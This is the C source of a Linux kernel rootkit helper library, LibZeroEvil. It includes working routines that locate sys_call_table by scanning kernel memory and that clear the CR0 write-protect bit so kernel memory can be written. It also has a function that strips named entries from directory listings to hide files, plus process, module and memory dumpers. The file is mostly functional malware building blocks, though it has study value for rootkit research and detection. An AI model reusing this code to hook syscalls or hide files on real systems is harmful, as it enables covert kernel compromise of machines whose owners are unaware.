// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
//
// This file is part of LibZeroEvil.
//
// LibZeroEvil is free software:
// you can redistribute it and/or modify it
// under the terms of the GNU General Public License
// as published by the Free Software Foundation,
// either version 3 of the License,
// or (at your option) any later version.
//
// LibZeroEvil is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with LibZeroEvil.
// If not, see <http://www.gnu.org/licenses/>.


# ifndef CPP
# include <linux/kernel.h>
// kmalloc, kfree.
# include <linux/slab.h>
// __NR_close.
# include <linux/syscalls.h>
# endif // CPP

# include "zeroevil.h"


// WARN: This can be cheated if someone places a faked
// but unmodified sys_call_table before the real one.
unsigned long **
get_sct_via_sys_close(void)
{
    unsigned long **entry = (unsigned long **)PAGE_OFFSET;

    for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
        if (entry[__NR_close] == (unsigned long *)sys_close) {
            return entry;
        }
    }

    return NULL;
}


unsigned long **
get_sct(void)
{
    return get_sct_via_sys_close();
}


// TODO: Consider race condition on SMP systems.
void
disable_wp(void)
{
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    clear_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();

    return;
}


// TODO: Consider race condition on SMP systems.
void
enable_wp(void)
{
    unsigned long cr0;

    preempt_disable();
    cr0 = read_cr0();
    set_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();

    return;
}


void
print_process_list(void)
{
    char *buff;
    struct task_struct *task;

    buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!buff) {
        return;
    }

    strlcpy(buff, init_task.comm, PAGE_SIZE);
    for_each_process (task) {
        strlcat(buff, " ", PAGE_SIZE);
        strlcat(buff, task->comm, PAGE_SIZE);
    }
    fm_alert("%s\n", buff);

    kfree(buff);
    return;
}

// INFO: Refer to ``next_task`` & ``for_each_process``.
# define next_module(m)                             \
    list_entry((m)->list.next, struct module, list)

// WARN: Excluding THIS_MODULE.
# define for_each_module(m)                                         \
    for (m = THIS_MODULE; (m = next_module(m)) != THIS_MODULE; )

void
print_module_list(void)
{
    char *buff;
    struct module *mod;

    buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!buff) {
        return;
    }

    strlcpy(buff, THIS_MODULE->name, PAGE_SIZE);
    for_each_module(mod) {
        strlcat(buff, " ", PAGE_SIZE);
        strlcat(buff, mod->name, PAGE_SIZE);
    }
    fn_alert("%s\n", buff);

    kfree(buff);
    return;
}


// TODO: print_dirent64.
void
print_dirent(struct linux_dirent *dirp, long total)
{
    char *buff;
    long index;
    struct linux_dirent *cur;

    buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!buff) {
        return;
    }

    strlcpy(buff, dirp->d_name, PAGE_SIZE);
    index = dirp->d_reclen;
    cur = (struct linux_dirent *)((unsigned long)dirp + index);
    while (index < total) {
        strlcat(buff, " ", PAGE_SIZE);
        strlcat(buff, cur->d_name, PAGE_SIZE);
        index += cur->d_reclen;
        cur = (struct linux_dirent *)((unsigned long)dirp + index);
    }

    fm_alert("%s\n", buff);
    kfree(buff);

    return;
}


// TODO: remove_dirent64_entry.
long
remove_dirent_entry(char *name,
                    struct linux_dirent *dirp, long total)
{
    struct linux_dirent *cur = dirp;
    long index = 0;

    while (index < total) {
        if (strncmp(cur->d_name, name, strlen(name)) == 0) {
            unsigned long next = (unsigned long)cur + cur->d_reclen;
            long rest = (unsigned long)dirp + total - next;
            long reclen = cur->d_reclen;
            fm_alert("Hiding: %s\n", cur->d_name);
            memmove(cur, (void *)next, rest);
            total -= reclen;
        }
        index += cur->d_reclen;
        cur = (struct linux_dirent *)((unsigned long)dirp + index);
    }

    return total;
}


// TODO: Can we provide these functionality to both user mode and
// kernel land users in a single code base?
char *
join_strings(const char *const *strings, const char *delim,
             char *buff, size_t count)
{
    int index;
    const char *one;

    strlcpy(buff, strings[0], count);

    index = 1;
    one = strings[index];
    while (one) {
        strlcat(buff, delim, count);
        strlcat(buff, one, count);

        index += 1;
        one = strings[index];
    }

    return buff;
}


void
print_memory(void *addr, size_t count, const char *prompt)
{
    const size_t ONE_SIZE = 3;
    char one[ONE_SIZE];
    size_t index;
    char *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);

    if (!buff) {
        fm_alert("%s\n", "kmalloc failed!");
        return; // TODO: Do something else?
    }

    snprintf(one, ONE_SIZE, "%02x", *((unsigned char *)addr));
    strlcpy(buff, one, PAGE_SIZE);

    for (index = 1; index < count; index += 1) {
        if (index && index % 16 == 0) {
            strlcat(buff, "\n", PAGE_SIZE);
        } else {
            strlcat(buff, " ", PAGE_SIZE);
        }

        snprintf(one, ONE_SIZE, "%02x",
                 *((unsigned char *)addr + index));
        strlcat(buff, one, PAGE_SIZE);
    }

    fm_alert("%s: %s\n", prompt, buff);

    kfree(buff);

    return;
}
